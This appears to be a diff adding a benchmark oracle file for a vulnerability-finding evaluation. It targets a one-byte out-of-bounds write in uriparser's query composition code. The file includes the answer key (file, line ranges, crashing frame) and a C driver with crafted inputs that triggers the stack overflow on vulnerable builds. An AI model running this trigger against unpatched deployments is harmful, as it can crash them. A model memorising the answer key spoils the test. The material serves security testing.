@@ -1,0 +1,52 @@
+[oracle]
+schema_version = 1
+policy_version = "calibration-oracle-v1"
+case_id = "case_f521543734c7e34a"
+upstream_reference = "https://github.com/uriparser/uriparser/commit/864f5d4c127def386dd5cc926ad96934b297f04e"
+weakness = "query capacity accounting omits an ampersand and permits a one-byte out-of-bounds write"
+supported_family = "bounded-write-capacity"
+required_hunter = "c-bounds-integers"
+
+[fixed_source]
+repository = "https://github.com/uriparser/uriparser.git"
+commit = "864f5d4c127def386dd5cc926ad96934b297f04e"
+tree = "93fc7413978a41ebc64234bd9f05b11f9b30d3aa"
+
+[location]
+entry_file = "src/UriQuery.c"
+entry_line_min = 110
+entry_line_max = 180
+sink_file = "src/UriQuery.c"
+sink_line_min = 205
+sink_line_max = 255
+required_paths = ["src/UriQuery.c"]
+
+[reproduction]
+kind = "compiled-driver"
+artifact_glob = "**/liburiparser.a"
+compile_argv = ["cc", "-fsanitize=address,undefined", "-I/code/include", "{source}", "{artifact}", "-o", "{executable}"]
+run_argv = ["{executable}"]
+attempts = 2
+timeout_seconds = 30
+expected_vulnerable_sanitizer = "stack-buffer-overflow"
+expected_vulnerable_frame = "ComposeQueryEngine"
+expected_fixed_stdout = "rejected"
+source = '''
+#include <stdio.h>
+#include "uriparser/Uri.h"
+
+int main(void) {
+    UriQueryListA second = {"\x11", NULL, NULL};
+    UriQueryListA first = {"\x01", "\x02", &second};
+    char destination[10];
+    int written = 0;
+    int result = uriComposeQueryExA(destination, &first, sizeof(destination),
+                                    &written, URI_TRUE, URI_FALSE);
+    if (result == URI_ERROR_OUTPUT_TOO_LARGE) {
+        puts("rejected");
+        return 0;
+    }
+    puts("accepted");
+    return 0;
+}
+'''
